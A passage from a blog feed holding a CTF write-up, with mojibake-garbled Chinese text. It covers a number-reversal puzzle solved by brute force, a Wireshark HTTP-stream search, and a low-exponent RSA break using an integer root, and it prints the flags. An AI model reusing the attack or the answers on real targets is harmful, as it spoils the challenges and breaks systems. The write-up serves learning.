<h2 id="çå¦®çš„qqå·"><a href="#çå¦®çš„qqå·" class="headerlink" title="çå¦®çš„qqå·"></a>çå¦®çš„qqå·</h2><p>æ•°å­¦é¢˜ï¼Œä¹Ÿå¯ä»¥å†™ä¸ªpyè·‘ä¸€ä¸‹å°±å‡ºæ¥äº†<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># by:xishir</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000</span>,<span class="number">100000</span>):</span><br><span class="line">	j=i*<span class="number">4</span></span><br><span class="line">	<span class="keyword">if</span> j&lt;<span class="number">100000</span>:</span><br><span class="line">		si=str(i)</span><br><span class="line">		sj=str(j)</span><br><span class="line">		<span class="keyword">if</span> si[<span class="number">0</span>]==sj[<span class="number">4</span>] <span class="keyword">and</span> si[<span class="number">1</span>]==sj[<span class="number">3</span>] <span class="keyword">and</span> si[<span class="number">2</span>]==sj[<span class="number">2</span>] <span class="keyword">and</span> si[<span class="number">3</span>]==sj[<span class="number">1</span>] <span class="keyword">and</span> si[<span class="number">4</span>]==sj[<span class="number">0</span>]:</span><br><span class="line">			<span class="keyword">print</span> j</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
<h2 id="å¿ƒä»ªçš„å…¬å¸"><a href="#å¿ƒä»ªçš„å…¬å¸" class="headerlink" title="å¿ƒä»ªçš„å…¬å¸"></a>å¿ƒä»ªçš„å…¬å¸</h2><p>wiresharkæ‰“å¼€ï¼Œè¿½è¸ªhttpæµæ‰¾åˆ°flag<br><img src="/img/2017-sab-misc3.png" alt=""><br><code>fl4g:{ftop_Is_Waiting_4_y}</code></p>
<h1 id="å¯†ç å­¦"><a href="#å¯†ç å­¦" class="headerlink" title="å¯†ç å­¦"></a>å¯†ç å­¦</h1><h2 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">c= <span class="number">2044619806634581710230401748541393297937319</span> </span><br><span class="line">n= <span class="number">92164540447138944597127069158431585971338721360079328713704210939368383094265948407248342716209676429509660101179587761913570951794712775006017595393099131542462929920832865544705879355440749903797967940767833598657143883346150948256232023103001435628434505839331854097791025034667912357133996133877280328143</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">10</span>):</span><br><span class="line">    m = libnum.nroot(c,e)</span><br><span class="line">    <span class="keyword">if</span> m**e==c:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"e:"</span>,e</span><br><span class="line"><span class="keyword">print</span> <span class="string">"m:"</span>,m</span><br><span class="line">flag = libnum.n2s(m)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
<p><code>so_low</code></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;emmmmmmmmï¼Œå…³äºæ¯”èµ›è´¨é‡é—®é¢˜ï¼Œå‡ºé—¨å·¦è½¬&lt;a href=&quot;https://www.zhihu.com/question/66360616&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;çŸ¥ä¹&lt;/a&gt;ï¼Œå‡ºé—¨å³è½¬&lt;a href=&quot;https://ctfrank.org/events/39&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ctfrank&lt;/a&gt;&lt;br&gt;æ˜¨å¤©ç«Ÿç„¶æ¥åˆ°äº†å†³èµ›é€šçŸ¥ç”µè¯ï¼Œè€ƒè™‘åˆ°å„ç§é—®é¢˜ï¼Œæœ€åè¿˜æ˜¯å¼ƒæƒäº†&lt;br&gt;ä»¥ä¸‹æ˜¯çº¿ä¸Šèµ›wp&lt;br&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
  </entry>
  
</feed>
